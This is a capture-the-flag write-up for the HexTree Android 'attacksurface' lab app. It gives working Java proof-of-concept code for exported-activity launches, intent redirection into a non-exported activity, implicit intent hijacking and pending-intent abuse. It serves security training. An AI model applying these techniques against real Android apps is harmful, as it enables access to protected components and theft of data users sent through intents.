
2025-06-09 10:57

Source: #android #CTF 
# Activity  

Take the apk in jadx and check the android manifest to find activities related to flag
click on the flag activity and we see a call to success() function 
our goal is to reach the success() function in all of these challenges
#### 1 - basic exported activity

note the package name and complete class name 

write this java code in your POC app
```java
public void onClick(View view) {  
    Intent expintent = new Intent();  
    expintent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag1Activity");  
    startActivity(expintent);  
}
```
#### 2 - Intent w extras

snippet from android manifest of flag2 
```xml
<intent-filter>
    <action android:name="io.hextree.action.GIVE_FLAG"/>
</intent-filter>
```

add the code below to the code we wrote for 1 - basic exported activity 
```java
expintent.setAction("io.hextree.action.GIVE_FLAG");
```
#### 3 - Intent w data URI

snippet from android manifest of flag 3 
```xml
<intent-filter>
    <action android:name="io.hextree.action.GIVE_FLAG"/>
    <data android:scheme="https"/>
</intent-filter>
```
on clicking flag4activity, it has an if loop that check if the data parsed has a particular URI, so we use that URI while creating the POC app

add the code below to the code we wrote for 1 - basic exported activity 
```java
expintent.setAction("io.hextree.action.GIVE_FLAG");
expintent.setData(Uri.parse("https://app.hextree.io/map/android"));
```

#### 4 - State machine 

when looking at the flag4activity code in jadx we see multiple actions nested in `if` loops - like so
```java
if (ordinal != 0) {
     if (ordinal != 1) {
        if (ordinal != 2) {
            if (ordinal == 3) {
                this.f.addTag(State.GET_FLAG);
                setCurrentState(State.INIT);
                success(this);
                Log.i("Flag4StateMachine", "solved");
                return;
            }
	        ...
        } else if ("GET_FLAG_ACTION".equals(action)) { ....
            Log.i("Flag4StateMachine", "Transitioned from BUILD to GET_FLAG");
            return;
        }
    } else if ("BUILD_ACTION".equals(action)) {
        ...
		... // more else if loops 
```

This hints that we might have to make multiple intents for every action 

```java
Intent exploitIntent3 = new Intent();  
exploitIntent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent3.setAction("GET_FLAG_ACTION");  
startActivity(exploitIntent3);  
  
Intent exploitIntent2 = new Intent();  
exploitIntent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent2.setAction("BUILD_ACTION");  
startActivity(exploitIntent2);  
  
Intent exploitIntent = new Intent();  
exploitIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");  
exploitIntent.setAction("PREPARE_ACTION");  
startActivity(exploitIntent);
```
#### 5 - Intent in intent

jump through multiple intent to reach `success()`, below is the code snippet from `flag5activity` from `jadx`.
```java
public void onCreate(Bundle bundle) {
	    ...
        Intent intent = getIntent();
        Intent intent2 = (Intent) intent.getParcelableExtra("android.intent.extra.INTENT");
        if (intent2 == null || intent2.getIntExtra("return", -1) != 42) {
            return;
        }
        this.f.addTag(42);
        Intent intent3 = (Intent) intent2.getParcelableExtra("nextIntent");
        this.nextIntent = intent3;
        if (intent3 == null || intent3.getStringExtra("reason") == null) {
            return;
        }
        this.f.addTag("nextIntent")
        ... // similar patterned code ahead 
```

We will use `putExtra()` here to call intent in an intent
```java
public void onClick(View view) {  
    Intent nextIntent = new Intent();  
    nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
    nextIntent.putExtra("reason", "back");  
 
    Intent middleIntent = new Intent();  
    middleIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
    middleIntent.putExtra("return", 42);           
    middleIntent.putExtra("nextIntent", nextIntent);  
  
    Intent outerIntent = new Intent();  
    outerIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");  
    outerIntent.putExtra("android.intent.extra.INTENT", middleIntent);  
    startActivity(outerIntent);  
}
```

#### 6 - Not exported

in the android manifest we see this activity with `android:exported="false"`
on seeing the intent redirect vulnerability in flag5activity we can exploit that to redirect the `startactivity` call to `flag6activity` .

the flag6activity looks like this - 
```java
super.onCreate(bundle);
    this.f = new LogHelper(this);
    if ((getIntent().getFlags() & 1) != 0) {
    this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
    success(this);
}
```
we're gonna have to use `setFlags()` while writing our intent 

```java
nextIntent.putExtra("reason", "next");  
nextIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);  
nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");
```
Do exactly the same as in the flag5 to get to the `startactivity()` call, then add the above code to the respective intent.

#### 7 - Activity lifecycle tricks

on seeing the flag7activity code we see The [onNewIntent](https://developer.android.com/reference/android/app/Activity#onNewIntent%28android.content.Intent%29) method being used here means that when the activity is re-launched while at the top of the stack (so - the app can’t close) then `onNewIntent` will be called on the existing instance with the intent that was used to re-launch it.

```java
    public void onCreate(Bundle bundle) {
        ...
        if (action == null || !action.equals("OPEN")) {
            return;
        }
        this.f.addTag("OPEN");
    }
    
    public void onNewIntent(Intent intent) {
		...
        if (action == null || !action.equals("REOPEN")) {
            return;
        }
        this.f.addTag("REOPEN");
        success(this);
    }
```

So we can implement the following code, which needed a slight delay to ensure that there was enough time to log and wait for the second request:

```java
public void onClick(View v){  
    Intent intent = new Intent();  
    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");  
    intent.setAction("OPEN");  
    startActivity(intent);  
  
    v.postDelayed(() -> {  
        Intent intent2 = new Intent();  
        intent2.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag7Activity");  
        intent2.setAction("REOPEN");  
        intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);  
        startActivity(intent2);  
    }, 100);  
}
```
# Activity Result 

Applications often use intents to reach out and trigger activities within other applications - often times there is a need for two-way communication to get the result of an activity being performed on another app.
#### 8 - Do you expect a result?

Meeting these conditions is as simple as changing the name of our `MainActivity` to `MainHextreeActivity` and calling the `Flag8Activity` while being prepared to handle the activity result:

### 9 - Receive result with flag

This activity will send us the flag in the intent that it will send back - so we can re-use the Flag8Activity code which fulfills the conditions while changing the target intent:
```java
public void onCreate(Bundle bundle) {
        ...
        if (callingActivity == null || !callingActivity.getClassName().contains("Hextree")) {
            return;
        }
        Intent intent = new Intent("flag");
        ...
        success(this);
    }
```

So our code still has the name containing `Hextree` and we use a request code of `42` which satisfies the conditions. Then the target activity sends an intent to our app and we can see it in the `Utils.showDialog` window:

```java
public class MainHextreeActivity extends AppCompatActivity {  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
	....
			 public void onClick(View v){  
                Intent intent = new Intent();  
                intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity"));  
                startActivityForResult(intent, 42);  
            }  
  
	@Override  
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent intent){  
        super.onActivityResult(requestCode, resultCode, intent);  
        Utils.showDialog(this, intent);  
    }
```

# Implicit Intent Hijacking 
### 10 - Hijacking Implicit intents 

> **Exported = "false"**

the flag10activity code is given below.
```java
		    ...
            Toast.makeText(this, "Sending implicit intent with the flag\nio.hextree.attacksurface.ATTACK_ME", 1).show();
            Intent intent = new Intent("io.hextree.attacksurface.ATTACK_ME");
            intent.addFlags(8);
            this.f.addTag(intent);
            intent.putExtra("flag", this.f.appendLog(this.flag));
            try {
                startActivity(intent);  //this is why our second activity code is empty 
                success(this);
            } ...
```
This is will check every app on the device that can handle that intent action, we will declare that intent action in out intent filter thereby forcing apps to use our app. 

So it seems like as long as we declare an activity to work with the specified intent filter it should work. We can modify our manifest and `SecondActivity.java` as follows:

```xml
<activity  
    android:name=".SecondActivity"  
    android:exported="true">  
    <intent-filter>        
	    <action android:name="io.hextree.attacksurface.ATTACK_ME"/>  
        <category android:name="android.intent.category.DEFAULT"/>  
    </intent-filter>
</activity>
```

```java
public class SecondActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
    }
}
```

As you can see, my second activity doesn’t do anything because it doesn’t have to. Flag 10 only needs to be able to find an activity capable of handling the intent - then it will reveal the flag.
### 11 - Respond to implicit intent

This is pretty similar to the last one except we need our program to reply with an intent that carries a specific token value.
We make an intent to be returned to the target application that has the extra set on it for the token along with its specified value. We use `setResult` to say that we want to send the `resultIntent` we made back to the caller. We can then use `finish()` to manually close our activity

for secondactivity the one that has the correct intent filter set in the manifest.
```java
Intent intent = new Intent();  
intent.putExtra("token", 1094795585);  
Utils.showDialog(this, intent);  
setResult(42, intent);  
finish();
```
### 12 - Careful intent condition

This is similar to previous challenge but we have a `onActivityResult` that checks for a `LOGIN = True` condition. 
So we first need to send an intent where `LOGIN` is set to true, then have our second activity send over the token and the specified value.

MainHextreeActivity
```java
Intent intent = new Intent();  
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag12Activity");  
intent.putExtra("LOGIN",true);  
startActivityForResult(intent,42);
```

secondActivity
```java
Intent intent = new Intent();  
intent.putExtra("token", 1094795585);  
Utils.showDialog(this, intent);  
setResult(42, intent);  
finish();
```
Then we launch the app and fire the `LOGIN` intent with the button from our main activity, then the flag activity will call out second activity which will respond with the token and the value which in turn calls `success()` and gives us the flag.
# Pending Intents

These are intents that allow one app to create a start activity intent and give it to another app to perform the activity with the original app’s level of privilege.
### 22 - Receive a pending intent

flag22 jadx o/p
```java
PendingIntent pendingIntent = (PendingIntent) getIntent().getParcelableExtra("PENDING");
        if (pendingIntent != null) {
            try {  
	            Intent intent = new Intent();
                intent.getExtras();
                intent.putExtra("success", true);
                this.f.addTag(intent);
                intent.putExtra("flag", this.f.appendLog(this.flag));
                pendingIntent.send(this, 0, intent);
                success(null, this);
            }
```

The program is set up to see if the intent that was used to start the activity had the `PENDING` extra set. Once this happens, the program creates a new intent that includes the flag as an extra and sends it back to the calling application within a pending intent.
```java
		Intent intent = new Intent();  
        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));  
  
        PendingIntent pendingIntent = PendingIntent.getActivity(this,0,intent,PendingIntent.FLAG_MUTABLE);  
        intent.putExtra("PENDING",pendingIntent);  
	...
			public void onClick(View v) {  
                startActivity(intent);  
            }  
```
So we first make an intent to send to the flag activity. We then package our intent as a pending intent and send it with the extra `PENDING`. We need to make sure that the pending intent has the `MUTABLE` flag set - if we don’t then `Flag22Activity` won’t be able to modify the intent before sending it back.
# Hijacking Deep Link Intents



## References
https://www.youtube.com/watch?v=jnBmI1eD-og
https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/
https://gaberoy.zip/posts/android-intent/android-intent/#flag-8---did-you-expect-a-result